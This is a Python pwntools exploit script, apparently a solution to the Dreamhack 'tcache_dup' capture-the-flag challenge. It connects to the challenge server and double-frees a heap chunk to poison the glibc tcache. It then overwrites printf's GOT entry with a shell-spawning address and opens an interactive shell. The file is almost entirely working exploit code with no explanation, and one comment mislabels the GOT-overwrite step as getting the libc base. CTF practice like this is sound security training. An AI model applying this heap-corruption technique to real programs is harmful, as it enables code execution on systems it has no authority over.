# Name: tcache_poison.py
#!/usr/bin/python3
from pwn import *

p = remote("host1.dreamhack.games", 14517)
e = ELF("./tcache_dup")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")

# gdb.attach(p)
def slog(symbol, addr): return success(symbol + ": " + hex(addr))

context.log_level = 'debug'

def alloc(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter(":", str(size))
    p.sendafter(":", data)

def free(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter(":", str(idx))

get_shell = 0x400ab0
printf_got = e.got["printf"]

#[1]Tcache duplication
alloc(0x30, "junthe")
free(0)
free(0)

#[2]Get libc base
alloc(0x30, p64(printf_got))
alloc(0x30, "AA")
alloc(0x30, p64(get_shell))

p.interactive()